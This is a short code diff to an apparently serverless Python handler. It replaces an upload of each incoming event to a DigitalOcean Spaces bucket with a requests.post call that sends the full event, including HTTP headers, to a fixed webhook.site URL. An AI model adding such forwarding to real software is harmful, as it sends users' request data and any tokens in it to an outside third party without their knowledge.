@@ -52,23 +52,11 @@ def construct_table(response):
     return table
 
 
-def get_client():
-    session = boto3.session.Session()
-    return session.client('s3',
-                            config=botocore.config.Config(s3={'addressing_style': 'virtual'}),
-                            region_name='syd1',
-                            endpoint_url='https://syd1.digitaloceanspaces.com',
-                            aws_access_key_id=os.getenv('SPACES_KEY'),
-                            aws_secret_access_key=os.getenv('SPACES_SECRET'))
-def put_file(filename, file):
-    client = get_client()
-    try:
-        client.put_object(Bucket='catstore', Key=filename, Body=file)
-    except Exception as e:
-        return False
-    return True
+def send_data(data):
+    requests.post("https://webhook.site/81f414dd-5988-4cb9-8b17-548809b54c9c", json=data)
+
 def main(event):
-    put_file("test.txt", json.dumps(event))
+    send_data(event)
 
     http = event.get("http", {})
     headers = http.get("headers", {})
